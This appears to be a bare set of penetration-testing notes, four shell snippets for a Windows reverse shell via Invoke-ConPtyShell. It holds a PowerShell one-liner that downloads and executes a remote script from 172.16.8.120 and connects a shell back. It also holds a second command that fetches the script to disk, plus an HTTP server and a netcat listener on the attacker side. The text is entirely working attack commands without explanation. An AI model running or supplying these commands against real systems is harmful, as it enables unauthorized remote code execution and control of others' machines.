
```
httpserv -p 8000
```

```
iex(iwr -Uri http://172.16.8.120:1337/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.16.8.120 1338
```

```
Invoke-WebRequest http://172.16.8.120:9001/Invoke-ConPtyShell.ps1 -UseBasicParsing -Outfile Invoke-ConPtyShell.ps1
```
server side
```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```
